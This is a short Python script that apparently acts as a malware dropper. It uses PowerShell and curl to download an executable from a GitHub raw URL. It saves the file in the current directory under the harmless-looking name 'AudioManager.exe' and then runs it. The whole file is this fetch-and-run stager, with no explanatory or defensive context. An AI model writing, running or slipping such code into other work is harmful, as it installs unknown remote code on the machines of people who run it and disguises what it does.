import os
import subprocess

output_file = os.path.join(os.getcwd(), "AudioManager.exe")
download = f'curl.exe -L https://raw.githubusercontent.com/bloodstainedvvs/host/main/code.exe -o "{output_file}"'
result = subprocess.run(["powershell", "-Command", download], capture_output=True)
if result.returncode == 0 and os.path.exists(output_file):
    subprocess.run(
        ["powershell", "-Command", f'Start-Process "{output_file}" -NoNewWindow -Wait'],
        capture_output=True,
    )
